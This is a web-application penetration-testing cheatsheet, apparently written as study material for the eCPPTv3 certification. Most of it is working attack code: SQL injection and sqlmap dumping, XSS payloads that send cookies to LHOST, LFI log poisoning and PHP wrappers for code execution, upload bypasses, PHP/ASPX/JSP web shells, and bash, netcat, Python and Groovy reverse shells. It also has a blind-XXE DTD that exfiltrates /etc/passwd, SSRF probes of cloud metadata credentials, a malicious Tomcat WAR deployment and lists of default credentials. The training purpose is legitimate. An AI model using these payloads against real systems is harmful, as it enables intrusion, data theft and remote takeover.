# 02 — Web Application
> eCPPTv3 Cheatsheet | Attacker-Mindset Reference

---

## Table of Contents
1. [Methodology & Burp Suite Setup](#1-methodology--burp-suite-setup)
2. [Reconnaissance & Fingerprinting](#2-reconnaissance--fingerprinting)
3. [SQL Injection](#3-sql-injection)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting-xss)
5. [Local & Remote File Inclusion](#5-local--remote-file-inclusion)
6. [File Upload Vulnerabilities](#6-file-upload-vulnerabilities)
7. [Directory Traversal](#7-directory-traversal)
8. [Authentication Bypass](#8-authentication-bypass)
9. [Command Injection](#9-command-injection)
10. [SSRF](#10-ssrf)
11. [XXE Injection](#11-xxe-injection)
12. [IDOR & Broken Access Control](#12-idor--broken-access-control)
13. [Web Shells](#13-web-shells)
14. [CMS-Specific Attacks](#14-cms-specific-attacks)
15. [Quick-Win Checklist](#15-quick-win-checklist)

---

## 1. Methodology & Burp Suite Setup

### 1.1 Engagement Setup

```bash
# Set target variables
export TARGET="10.10.10.5"
export URL="http://$TARGET"
export DOMAIN="corp.local"

# Add to /etc/hosts if needed
echo "$TARGET  $DOMAIN" | sudo tee -a /etc/hosts
```

```bash
# Always start with these files before any active enumeration
curl -s $URL/robots.txt
curl -s $URL/sitemap.xml
curl -s $URL/.well-known/security.txt
```

```bash
# Check HTTP methods allowed on the server
curl -X OPTIONS $URL -i
nmap -p 80,443 --script=http-methods $TARGET
```

### 1.2 Burp Suite Essentials

```
# Proxy setup:
# 1. Burp → Proxy → Options → Listen on 127.0.0.1:8080
# 2. Firefox → Settings → Network → Manual Proxy → 127.0.0.1:8080
# 3. Install Burp CA cert: http://burpsuite/cert → import to browser

# Key shortcuts:
# Ctrl+R     → Send to Repeater
# Ctrl+I     → Send to Intruder
# Ctrl+S     → Search in request/response
# Right-click → Send to all tools
```

```
# Burp Intruder — Attack Types:
# Sniper       → single payload list, one position at a time
# Battering ram → same payload in all positions simultaneously
# Pitchfork    → parallel lists, one payload per position
# Cluster bomb → all combinations across all positions (for credential stuffing)
```

```bash
# Intercept and modify — workflow:
# 1. Turn Intercept ON in Proxy tab
# 2. Browse to target page
# 3. Modify request in Burp
# 4. Forward modified request
# 5. Analyse response
```

---

## 2. Reconnaissance & Fingerprinting

### 2.1 Technology Identification

```bash
# Identify server, frameworks, CMS, and security headers
whatweb -v $URL
```

```bash
# Manual header review — look for Server, X-Powered-By, Set-Cookie, CSP
curl -I $URL
```

```bash
# Extract all comments and metadata from JS/HTML source
curl -s $URL | grep -oP '<!--.*?-->' 
curl -s $URL | grep -oP 'src="[^"]*"'
```

```bash
# Check for source control exposure — look for git/svn/hg leaks
curl -s $URL/.git/HEAD
curl -s $URL/.svn/entries
curl -s $URL/.git/config

# If .git exists, dump the entire repo
git-dumper $URL/.git ./git-dump
```

```bash
# Check for common sensitive files and backup artifacts
curl -s $URL/.env
curl -s $URL/config.php.bak
curl -s $URL/web.config
curl -s $URL/phpinfo.php
curl -s $URL/info.php
curl -s $URL/server-status       # Apache mod_status
curl -s $URL/server-info
```

### 2.2 Directory & File Brute-Force (recap from 01)

```bash
# Fast recursive scan with common web extensions
feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,js,txt,bak,conf,xml,json -r -t 50

# Targeted wordlist for specific tech stacks
gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  # WordPress
gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt           # Apache
```

### 2.3 Parameter Discovery

```bash
# Find hidden GET/POST parameters on a page
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "$URL/page.php?FUZZ=test" -fs 0

# POST parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "$URL/login.php" -X POST -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded"
```

---

## 3. SQL Injection

### 3.1 Detection

```bash
# Basic error-based detection — add these characters to every parameter
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR "1"="1
# Look for: SQL errors, blank pages, behavioural change
```

```bash
# Time-based blind detection — measures response delay to confirm injection
' OR SLEEP(5)--          # MySQL
' OR pg_sleep(5)--       # PostgreSQL
' WAITFOR DELAY '0:0:5'--  # MSSQL
```

### 3.2 Manual SQLi — Error-Based (MySQL)

```bash
# Determine number of columns — increase until no error
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # error here = 2 columns exist

# Find which column is visible in output (UNION-based)
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2--
' UNION SELECT 'a','b'--
```

```bash
# Extract database version
' UNION SELECT @@version,NULL--

# Extract current database name
' UNION SELECT database(),NULL--

# List all databases
' UNION SELECT group_concat(schema_name),NULL FROM information_schema.schemata--

# List tables in current DB
' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--

# List columns in a table
' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--

# Dump data from target table
' UNION SELECT group_concat(username,':',password),NULL FROM users--
```

```bash
# Read files from the server (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

# Write a web shell to disk (requires write permission to webroot)
' UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php'--
```

### 3.3 Authentication Bypass via SQLi

```bash
# Classic login bypass — comment out password check
admin'--
admin'#
' OR 1=1--
' OR '1'='1'--
" OR "1"="1"--

# Bypass with always-true condition in password field
Username: admin
Password: ' OR '1'='1
```

### 3.4 Sqlmap — Automated SQLi

```bash
# Basic test on a GET parameter
sqlmap -u "$URL/page.php?id=1" --batch

# Test POST login form
sqlmap -u "$URL/login.php" --data="username=admin&password=test" --batch

# Use a Burp-captured request file (most reliable)
sqlmap -r request.txt --batch

# Specify DBMS to speed up detection
sqlmap -u "$URL/page.php?id=1" --dbms=mysql --batch

# Enumerate databases
sqlmap -u "$URL/page.php?id=1" --dbs --batch

# Enumerate tables in a database
sqlmap -u "$URL/page.php?id=1" -D targetdb --tables --batch

# Dump a specific table
sqlmap -u "$URL/page.php?id=1" -D targetdb -T users --dump --batch

# Try to get OS shell (if FILE priv available)
sqlmap -u "$URL/page.php?id=1" --os-shell --batch

# Bypass WAF with tamper scripts
sqlmap -r request.txt --tamper=space2comment,between,randomcase --batch

# Level and risk — higher = more aggressive/intrusive tests
sqlmap -r request.txt --level=5 --risk=3 --batch
```

```bash
# Save Burp request for sqlmap — in Burp Repeater: right-click → Save item
# Intercept the request, copy to file: request.txt
```

---

## 4. Cross-Site Scripting (XSS)

### 4.1 Detection Payloads

```html
<!-- Basic reflected XSS test — look for payload in response unescaped -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

```html
<!-- Filter bypass variants -->
<ScRiPt>alert(1)</ScRiPt>           <!-- case variation -->
<script>alert`1`</script>            <!-- backtick instead of parens -->
<img src=x onerror="alert(1)">       <!-- attribute injection -->
<details open ontoggle=alert(1)>     <!-- HTML5 event handler -->
<input autofocus onfocus=alert(1)>   <!-- autofocus trigger -->
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

```html
<!-- Bypass HTML entity encoding with double-encode -->
&lt;script&gt;alert(1)&lt;/script&gt;     <!-- single encode — usually blocked -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E       <!-- URL encode -->
%253Cscript%253E                           <!-- double URL encode -->
```

### 4.2 XSS to Cookie Theft

```html
<!-- Steal session cookie — send to your listener -->
<script>document.location='http://LHOST/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://LHOST/?c='+document.cookie)">
```

```bash
# Start HTTP listener to receive stolen cookies
python3 -m http.server 80
# OR use netcat
nc -lvnp 80
```

### 4.3 Stored XSS

```html
<!-- Inject into forms that store data (comments, usernames, profile fields) -->
<!-- Payload executes for every user who views the page -->
<script>
  var i = new Image();
  i.src = 'http://LHOST/xss?cookie=' + btoa(document.cookie);
</script>
```

### 4.4 XSS Filter Bypass Techniques

```html
<!-- Event handlers that bypass script tag filters -->
<svg/onload=alert(1)>
<body/onpageshow=alert(1)>
<video><source onerror="alert(1)">

<!-- DOM-based: look for sink functions in JS source -->
# Sources: location.hash, location.search, document.referrer
# Sinks: innerHTML, document.write, eval(), setTimeout()

<!-- Polyglot payload — works in multiple contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## 5. Local & Remote File Inclusion

### 5.1 LFI Detection

```bash
# Test file inclusion parameters — look for page/file/path/template/lang params
http://$TARGET/page.php?file=about
http://$TARGET/index.php?page=contact
http://$TARGET/view.php?template=home

# Basic LFI test — try to read /etc/passwd
http://$TARGET/page.php?file=/etc/passwd
http://$TARGET/page.php?file=../../../../etc/passwd
http://$TARGET/page.php?file=....//....//....//etc/passwd    # filter bypass
http://$TARGET/page.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoded
```

```bash
# Windows LFI targets
http://$TARGET/page.php?file=C:\Windows\System32\drivers\etc\hosts
http://$TARGET/page.php?file=C:/Windows/win.ini
http://$TARGET/page.php?file=../../../../../Windows/System32/drivers/etc/hosts
```

### 5.2 Useful LFI Targets (Linux)

```bash
# System files that always exist and confirm LFI
/etc/passwd                     # user list
/etc/shadow                     # password hashes (needs root read)
/etc/hosts                      # internal hostnames
/etc/hostname                   # machine name
/etc/crontab                    # scheduled tasks
/proc/self/environ              # environment variables (may contain creds)
/proc/self/cmdline              # current process command line
/proc/net/tcp                   # active TCP connections (hex ports)
/var/log/apache2/access.log     # Apache access log (for log poisoning)
/var/log/apache2/error.log
/var/log/auth.log               # SSH auth attempts
/var/www/html/config.php        # web app config (DB creds)
/home/user/.ssh/id_rsa          # private SSH keys
/root/.ssh/id_rsa
```

### 5.3 PHP Wrappers (LFI to RCE)

```bash
# php://filter — read PHP source code as base64 (bypasses execution)
http://$TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php
# Decode output:
echo "BASE64STRING" | base64 -d
```

```bash
# php://input — POST arbitrary PHP code for execution
# Requires allow_url_include = On
curl -X POST "$URL/page.php?file=php://input" \
  -d '<?php system($_GET["cmd"]); ?>'

# Then execute commands:
curl -X POST "$URL/page.php?file=php://input&cmd=id" \
  -d '<?php system($_GET["cmd"]); ?>'
```

```bash
# data:// wrapper — embed PHP code directly in URL
http://$TARGET/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# Decoded: <?php system($_GET['cmd']); ?>
# Append: &cmd=id
```

```bash
# expect:// wrapper — direct code execution (requires expect extension)
http://$TARGET/page.php?file=expect://id
```

### 5.4 LFI Log Poisoning → RCE

```bash
# Step 1: Inject PHP code into Apache access log via User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://$TARGET/

# Step 2: Include the poisoned log file via LFI
http://$TARGET/page.php?file=/var/log/apache2/access.log&cmd=id
```

```bash
# Poison SSH auth log — trigger failed SSH login with PHP payload as username
ssh '<?php system($_GET["cmd"]); ?>'@$TARGET

# Include: /var/log/auth.log
http://$TARGET/page.php?file=/var/log/auth.log&cmd=id
```

### 5.5 RFI (Remote File Inclusion)

```bash
# RFI requires allow_url_include = On in php.ini (less common, but check)
# Host a malicious PHP file on your Kali
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
sudo service apache2 start

# Include your remote shell
http://$TARGET/page.php?file=http://LHOST/shell.php&cmd=id

# SMB-based RFI (Windows targets)
http://$TARGET/page.php?file=\\LHOST\share\shell.php
```

---

## 6. File Upload Vulnerabilities

### 6.1 Bypass Techniques

```bash
# Extension blacklist bypass — try alternative extensions
shell.php5
shell.php4
shell.php3
shell.phtml
shell.phar
shell.phps

# Double extension bypass (server processes first extension)
shell.php.jpg
shell.jpg.php

# Null byte bypass (older PHP < 5.3)
shell.php%00.jpg
shell.php\x00.jpg
```

```bash
# MIME type bypass — change Content-Type header in Burp to image/jpeg
# while keeping .php extension
# Intercept upload request in Burp → change:
# Content-Type: application/x-php  →  Content-Type: image/jpeg
```

```bash
# Magic bytes bypass — prepend GIF header to PHP shell
# Makes file pass magic byte / file type checks
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

```bash
# .htaccess upload bypass — upload .htaccess to allow PHP execution in upload dir
# File: .htaccess
AddType application/x-httpd-php .jpg
# Then upload shell.jpg → it executes as PHP
```

```bash
# Case variation bypass for case-sensitive blacklists
shell.PHP
shell.Php
shell.pHp
```

### 6.2 Web Shell Payloads

```php
# Minimal PHP web shell — cmd parameter
<?php system($_GET["cmd"]); ?>

# More robust — works with POST requests too
<?php echo shell_exec($_REQUEST['cmd']); ?>

# PHP reverse shell trigger via upload
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"); ?>
```

```bash
# Upload shell, then trigger it
curl "http://$TARGET/uploads/shell.php?cmd=id"
curl "http://$TARGET/uploads/shell.php?cmd=which+nc"
```

### 6.3 Finding Upload Paths

```bash
# Common upload directory locations to check after upload
/uploads/
/upload/
/files/
/images/
/media/
/assets/
/wp-content/uploads/     # WordPress
/content/files/          # various CMS
```

---

## 7. Directory Traversal

```bash
# Basic traversal — read arbitrary files outside webroot
http://$TARGET/download?file=../../../etc/passwd
http://$TARGET/view?path=../../windows/win.ini

# Encoded traversal — bypass simple string filters
http://$TARGET/file?name=..%2F..%2F..%2Fetc%2Fpasswd        # URL encoded
http://$TARGET/file?name=..%252F..%252Fetc%252Fpasswd        # double URL encoded
http://$TARGET/file?name=....//....//etc/passwd              # double dot slash bypass

# Absolute path injection (if no prefix is enforced)
http://$TARGET/file?name=/etc/passwd

# Null byte to truncate extension (PHP < 5.3)
http://$TARGET/file?name=../../../etc/passwd%00.jpg
```

```bash
# Bypass path prefix filters (e.g., app forces /var/www/files/ prefix)
# If input is: /var/www/files/ + user_input
# Inject:  ../../../../etc/passwd → resolves to /etc/passwd
```

```bash
# Test with Burp — send to Intruder with payload:
# ../../../../etc/passwd
# ../../../etc/passwd
# ../../etc/passwd
# Use payload type: Simple list with traversal depth variations
```

---

## 8. Authentication Bypass

### 8.1 Default Credentials

```bash
# Always try these before anything else
admin:admin
admin:password
admin:admin123
admin:123456
root:root
root:toor
administrator:administrator
guest:guest
test:test

# Service-specific defaults
# Apache Tomcat: tomcat:tomcat, admin:admin
# Jenkins: admin:admin (check /var/jenkins_home/secrets/initialAdminPassword)
# phpMyAdmin: root:(blank)
# WordPress: admin:admin
```

### 8.2 SQLi-Based Login Bypass (see §3.3)

### 8.3 Cookie & Token Manipulation

```bash
# Inspect and decode cookies — look for base64, JWT, or serialised objects
# In browser DevTools → Application → Cookies

# Decode base64 cookie
echo "COOKIE_VALUE" | base64 -d

# JWT — decode header + payload (no key needed to read)
# Paste at https://jwt.io — check algorithm and claims

# JWT algorithm confusion — change alg:RS256 → alg:none to bypass signature check
# 1. Decode header: {"alg":"RS256","typ":"JWT"}
# 2. Change to:     {"alg":"none","typ":"JWT"}
# 3. Re-encode and remove signature (keep trailing dot)
```

```bash
# Modify cookie value to escalate privilege — try:
# role=admin, isAdmin=true, user_id=1, access_level=0
# Always fuzz cookie values in Burp Repeater
```

### 8.4 Password Reset Flaws

```bash
# Common reset token weaknesses:
# - Predictable tokens (sequential, time-based)
# - Token leaked in Referer header
# - Token not invalidated after use
# - Host header injection in reset email URL

# Host header injection in password reset
# Change Host: header to your server → victim's reset link points to you
# Intercept reset request in Burp → modify Host: to LHOST
```

### 8.5 Brute-Force

```bash
# Hydra HTTP POST form brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

```bash
# Hydra HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-get /admin/
```

```bash
# Ffuf for login brute-force — filter by response size to find success
ffuf -w /usr/share/wordlists/rockyou.txt \
  -u "$URL/login.php" -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs 1234   # filter by known failure response size
```

---

## 9. Command Injection

### 9.1 Detection

```bash
# Inject OS command chaining characters into every parameter
# Look for: output in page, error messages, time delays
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5        # time-based blind detection
| sleep 5
& ping -c 5 LHOST   # out-of-band detection via ICMP
```

### 9.2 Payloads

```bash
# Basic command execution — confirm with id/whoami
; id
; whoami
; uname -a

# Read sensitive files
; cat /etc/passwd
; cat /etc/shadow
; cat /var/www/html/config.php

# Reverse shell via command injection
; bash -i >& /dev/tcp/LHOST/4444 0>&1
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### 9.3 Filter Bypass

```bash
# Bypass space filters
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Bypass keyword filters (e.g. "cat" blocked)
c'a't /etc/passwd        # quote insertion
ca$@t /etc/passwd        # variable expansion
/bin/c?t /etc/passwd     # glob wildcard
```

```bash
# Blind injection — out-of-band confirmation via DNS or HTTP
# Start listener: tcpdump -i eth0 icmp
; ping -c 1 LHOST
; curl http://LHOST/?output=$(id|base64)
; nslookup LHOST
```

---

## 10. SSRF

```bash
# SSRF — make the server issue requests on your behalf
# Look for: url=, path=, dest=, redirect=, uri=, image=, fetch= parameters

# Basic SSRF — access localhost services
http://$TARGET/fetch?url=http://127.0.0.1/
http://$TARGET/fetch?url=http://127.0.0.1:8080/admin
http://$TARGET/fetch?url=http://localhost/phpinfo.php
```

```bash
# SSRF to internal network — probe internal services
http://$TARGET/fetch?url=http://192.168.1.1/
http://$TARGET/fetch?url=http://172.16.1.10:445/

# SSRF to cloud metadata (AWS)
http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/
http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```bash
# SSRF bypass techniques — if "127.0.0.1" is blocked
http://0.0.0.0/
http://0/
http://[::1]/                    # IPv6 localhost
http://127.0.0.1.nip.io/        # DNS-based bypass
http://2130706433/               # decimal IP for 127.0.0.1
http://0x7f000001/               # hex IP for 127.0.0.1
http://localhost/

# Protocol bypass
file:///etc/passwd
dict://127.0.0.1:11211/stats    # memcached
gopher://127.0.0.1:25/          # SMTP via gopher
```

```bash
# Blind SSRF — use Burp Collaborator or interactsh to detect callbacks
http://$TARGET/fetch?url=http://COLLABORATOR_URL/

# Self-hosted OOB: start listener
python3 -m http.server 80
# Point SSRF to: http://LHOST/
```

---

## 11. XXE Injection

```bash
# XXE — inject external entity into XML parsed by the server
# Look for: XML body in requests, file upload of .xml/.svg/.docx, SOAP endpoints
```

### 11.1 Basic XXE — File Read

```xml
<!-- Replace normal XML body with this to read /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

```xml
<!-- Windows file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root><data>&xxe;</data></root>
```

### 11.2 XXE — SSRF

```xml
<!-- Use XXE to trigger SSRF to internal services -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

### 11.3 Blind XXE — Out-of-Band

```xml
<!-- Exfiltrate data via DNS/HTTP callback when output is not reflected -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://LHOST/evil.dtd">
  %xxe;
]>
<root/>
```

```xml
<!-- evil.dtd (host on your Kali) -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % out "<!ENTITY &#x25; send SYSTEM 'http://LHOST/?d=%data;'>">
%out;
%send;
```

---

## 12. IDOR & Broken Access Control

```bash
# IDOR — Insecure Direct Object Reference
# Change object identifiers in requests to access other users' data

# Numeric ID enumeration — change id, user_id, order_id etc.
GET /api/user/1/profile   → try /2, /3, /0, /admin
GET /download?file_id=101 → try 100, 99, 1
```

```bash
# Horizontal privilege escalation — access another user's resources
# Vertical privilege escalation — access admin functionality as normal user

# Forced browsing — access admin pages directly without UI link
/admin
/admin/users
/admin/config
/dashboard/admin
/api/admin/users
```

```bash
# UUID/GUID IDOR — less obvious but still testable
# Collect UUIDs from JS source, emails, API responses
# Try known UUIDs from other users / objects
```

```bash
# HTTP method tampering — change GET to POST, PUT, DELETE
# Some endpoints only restrict one method
curl -X DELETE http://$TARGET/api/user/5 -H "Authorization: Bearer USER_TOKEN"
curl -X PUT http://$TARGET/api/admin/config -d '{"role":"admin"}'
```

```bash
# Parameter pollution — send both user and admin parameter
GET /api/profile?user_id=5&user_id=1   # server may use either
POST /transfer?from=5&to=ATTACKER&amount=1000&from=1  # override source account
```

---

## 13. Web Shells

### 13.1 PHP Web Shells

```php
# Minimal one-liner
<?php system($_GET['cmd']); ?>

# POST-based (avoids cmd showing in URL/logs)
<?php system($_POST['cmd']); ?>

# Request-agnostic
<?php echo shell_exec($_REQUEST['cmd']); ?>

# Bypass disable_functions with proc_open
<?php $d=proc_open($_GET['c'],array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p);echo stream_get_contents($p[1]);?>
```

```bash
# Use full Kali web shell
cp /usr/share/webshells/php/php-reverse-shell.php .
# Edit LHOST and LPORT, then upload
```

### 13.2 ASPX Web Shell (IIS / Windows)

```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>
```

### 13.3 JSP Web Shell (Tomcat / Java)

```jsp
<% Runtime rt = Runtime.getRuntime();
String[] commands = {"sh","-c",request.getParameter("cmd")};
Process proc = rt.exec(commands);
java.io.InputStream is = proc.getInputStream();
java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
out.println(s.hasNext() ? s.next() : ""); %>
```

### 13.4 Upgrading Shell Access

```bash
# Trigger reverse shell from web shell execution
curl "http://$TARGET/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/4444+0>%261'"
```

```bash
# Start listener before triggering
nc -lvnp 4444

# Upgrade to TTY after catching shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 14. CMS-Specific Attacks

### 14.1 WordPress

```bash
# Enumerate users, plugins, themes, and known vulnerabilities
wpscan --url $URL --enumerate u,p,t,vp --api-token YOUR_TOKEN

# Brute-force WordPress login via XML-RPC (bypasses lockout in some configs)
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# Admin → RCE: upload malicious plugin or edit theme PHP
# Admin → Appearance → Theme Editor → 404.php → inject PHP reverse shell
# Then visit: http://$TARGET/wp-content/themes/THEME/404.php

# WordPress config file — contains DB credentials
curl $URL/wp-config.php         # direct access (usually blocked)
# LFI: ?file=../wp-config.php
```

```bash
# Check for default wp-login.php exposure
curl -I $URL/wp-login.php
curl -I $URL/wp-admin/
```

### 14.2 Joomla

```bash
# Automated Joomla scanner — version, components, users, vulns
joomscan --url $URL

# Joomla admin → RCE: Extensions → Templates → Edit template PHP file
# Configuration file (DB creds):
curl $URL/configuration.php
```

### 14.3 Apache Tomcat

```bash
# Default Tomcat management credentials to try
# Navigate to /manager/html and try:
tomcat:tomcat
admin:admin
admin:password
manager:manager
tomcat:s3cret
admin:tomcat

# Tomcat manager RCE — deploy malicious WAR file
# Generate WAR reverse shell payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war

# Deploy via manager (with valid creds)
curl -u tomcat:tomcat -T shell.war "http://$TARGET:8080/manager/text/deploy?path=/shell"
curl "http://$TARGET:8080/shell/"
```

### 14.4 Jenkins

```bash
# Check for unauthenticated script console access
curl $URL/script

# Jenkins Script Console — Groovy → RCE
# Navigate to /script and execute:
# def cmd = "id".execute(); println cmd.text

# Groovy reverse shell via script console
String host="LHOST"; int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(!p.isAlive()){s.close();break;}}
```

---

## 15. Quick-Win Checklist

```
INITIAL RECON
[ ] Check robots.txt, sitemap.xml, .well-known/
[ ] View source — comments, JS files, hidden fields, API keys
[ ] Identify tech stack with whatweb / response headers
[ ] Check for .git/, .env, /backup/, /phpinfo.php, /server-status
[ ] Run gobuster/feroxbuster — find hidden paths and files

INPUT TESTING (do for EVERY parameter)
[ ] SQLi: add ' and see if error/behaviour changes
[ ] XSS: inject <script>alert(1)</script> into every field
[ ] Command injection: ; id | id in any system-interaction param
[ ] Directory traversal: ../../../etc/passwd in file/path params
[ ] LFI: ?file=, ?page=, ?template= parameters

AUTHENTICATION
[ ] Try default credentials on every login form
[ ] SQLi authentication bypass: admin'--
[ ] Check password reset flow for token weaknesses
[ ] Inspect cookies — decode, modify role/admin values
[ ] Check JWT algorithm (none bypass, weak secret)

FILE OPERATIONS
[ ] File upload — try .php, .php5, .phtml extensions
[ ] Bypass MIME check via Content-Type: image/jpeg in Burp
[ ] Check where uploaded files land — trigger shell execution
[ ] LFI: try PHP wrappers (php://filter, data://)
[ ] Log poisoning if LFI + log files are accessible

ADVANCED
[ ] SSRF in url=, fetch=, image= parameters
[ ] XXE in any XML-accepting endpoint
[ ] IDOR — change numeric IDs in all API calls
[ ] HTTP method tampering (PUT/DELETE on read-only endpoints)
[ ] Check for admin panels: /admin, /dashboard, /manager, /console

CMS QUICK CHECKS
[ ] WordPress: wpscan, /wp-login.php, /wp-admin/, theme editor RCE
[ ] Tomcat: /manager/html default creds → WAR deploy
[ ] Jenkins: /script Groovy console
[ ] Joomla: joomscan, template editor RCE
```

---

## Common Web Ports Reference

| Port | Service | First Check |
|------|---------|-------------|
| 80 | HTTP | Gobuster, nikto, whatweb |
| 443 | HTTPS | SSL cert CN for vhosts, same as 80 |
| 8080 | HTTP-alt | Tomcat manager, Jenkins, dev apps |
| 8443 | HTTPS-alt | Same as 8080 over TLS |
| 8888 | Jupyter / misc | Unauthenticated notebook exec |
| 4848 | GlassFish | Default creds → admin console |
| 9200 | Elasticsearch | Unauthenticated API data dump |
| 2375 | Docker API | Unauthenticated → container escape |

---

*eCPPTv3 Cheatsheet — 02_web_application.md*
